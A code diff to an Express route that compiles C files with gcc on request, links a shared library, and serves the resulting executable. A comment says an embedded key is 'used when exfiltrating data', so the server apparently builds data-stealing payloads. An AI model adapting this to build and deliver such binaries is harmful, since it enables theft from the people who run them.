@@ -41,6 +41,13 @@ getReqRouter.get("/", (request, response, next) => {
 
     if (EXE_DATA[request.headers.exe])
     {
+        // First, let's handle the paths. Here we store the path of the EXE file so we can reference it later. It should be in the same directory under $exeName
+        var cDir = path.dirname(reqEXEData.cPath);          // 🤣 not to be confused with CDIR
+        let exePath = path.resolve(cDir, `./${exeName}`);
+
+        // We're also going to import the "Justin" library and bring in common.c
+        let libraryPath = path.resolve(__dirname, "./Executables/common.c");
+
         // Compiling might throw errors - here's where we catch that.
         try
         {
@@ -54,25 +61,22 @@ getReqRouter.get("/", (request, response, next) => {
                 // Now, compile the GCC with a newly generated POST Authkey (if necessary) that will be used to when exfiltrating data
                 // Spawning subprocesses is always very dangerous, but we mitigate this by not spawning a shell and basically having prepared statements
                 // See auth.js for more about how the Authentication is designed
-                execFileSync("gcc", [reqEXEData.cPath, `-D postKey=${authKey}`, `-o`, exeName])
+                execFileSync("gcc", [reqEXEData.cPath, libraryPath, `-D postKey=${authKey}`, `-o`, exePath])
             }
             else
             {
-                execFileSync("gcc", [reqEXEData.cPath, `-o`, exeName])
+                execFileSync("gcc", [reqEXEData.cPath, libraryPath, `-o`, exePath])
             }
 
             logging.log(`C file ${reqEXEData.cPath} from ${request.ip} compiled!`);
         }
         catch(err)
         {
-            logging.error(`Error in compiling C file ${reqEXEData.cPath} from ${request.ip}: ${err}`);
+            logging.error(`🔨 Error in compiling C file ${reqEXEData.cPath} from ${request.ip}: ${err}`);
             response.status(500);
             next();
+            return;
         }
-
-        // Use path to find the EXE file. It should be in the same directory under $exeName
-        var cDir = path.dirname(reqEXEData.cPath);          // 🤣 not to be confused with CDIR
-        let exePath = path.resolve(cDir, `./${exeName}`);
 
         // Send the EXE file
         response.sendFile(exePath, (err) => {
@@ -81,6 +85,7 @@ getReqRouter.get("/", (request, response, next) => {
                 logging.error(`🔨 Error in sending file ${exePath} to ${request.ip}: ${err}`);
                 response.status(500);
                 next();
+                return;
             }
             else
             {
